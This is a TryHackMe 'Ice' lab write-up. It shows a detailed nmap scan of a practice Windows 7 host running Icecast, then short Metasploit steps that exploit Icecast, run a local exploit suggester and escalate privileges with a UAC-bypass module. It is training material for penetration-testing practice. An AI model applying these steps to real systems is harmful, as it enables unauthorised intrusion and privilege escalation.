# The ICE

[Tryhackme ICE](https://tryhackme.com/room/ice)

## Initial Scan

```
# Nmap 7.80 scan initiated Mon Jan 31 22:14:35 2022 as: nmap -vvv -p 135,139,445,3389,5357,8000,49152,49153,49154,49159,49158,49160 -A -vv -sV -sC -oN nmap.txt 10.10.204.236
Nmap scan report for 10.10.204.236
Host is up, received conn-refused (0.21s latency).
Scanned at 2022-01-31 22:14:35 +06 for 130s

PORT      STATE SERVICE            REASON  VERSION
135/tcp   open  msrpc              syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn        syn-ack Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       syn-ack Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ssl/ms-wbt-server? syn-ack
|_ssl-date: 2022-01-31T16:15:45+00:00; -1s from scanner time.
5357/tcp  open  http               syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Service Unavailable
8000/tcp  open  http               syn-ack Icecast streaming media server
| http-methods:
|_  Supported Methods: GET
|_http-title: Site doesn't have a title (text/html).
49152/tcp open  msrpc              syn-ack Microsoft Windows RPC
49153/tcp open  msrpc              syn-ack Microsoft Windows RPC
49154/tcp open  msrpc              syn-ack Microsoft Windows RPC
49158/tcp open  msrpc              syn-ack Microsoft Windows RPC
49159/tcp open  msrpc              syn-ack Microsoft Windows RPC
49160/tcp open  msrpc              syn-ack Microsoft Windows RPC
Service Info: Host: DARK-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1h29m59s, deviation: 3h00m00s, median: 0s
| nbstat: NetBIOS name: DARK-PC, NetBIOS user: <unknown>, NetBIOS MAC: 02:d4:6d:54:05:f1 (unknown)
| Names:
|   DARK-PC<00>          Flags: <unique><active>
|   WORKGROUP<00>        Flags: <group><active>
|   DARK-PC<20>          Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
| Statistics:
|   02 d4 6d 54 05 f1 00 00 00 00 00 00 00 00 00 00 00
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|_  00 00 00 00 00 00 00 00 00 00 00 00 00 00
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 62190/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 46068/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 44353/udp): CLEAN (Timeout)
|   Check 4 (port 53157/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-os-discovery:
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: Dark-PC
|   NetBIOS computer name: DARK-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2022-01-31T10:15:40-06:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2022-01-31T16:15:40
|_  start_date: 2022-01-31T15:31:04

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Jan 31 22:16:45 2022 -- 1 IP address (1 host up) scanned in 130.43 seconds

```

## Icecast exploitation

- `search icecast` in metasploit
- `select 0`
- `show options`
- `set LHOST <tun0IP>`
- `run post/multi/recon/local_exploit_suggester` to get suggestions for local exploit
- `exploit/windows/local/bypassuac_eventvwr` escalated privilage
- `getprivs` to show the current privilages we have
- `ps` to show the processes running
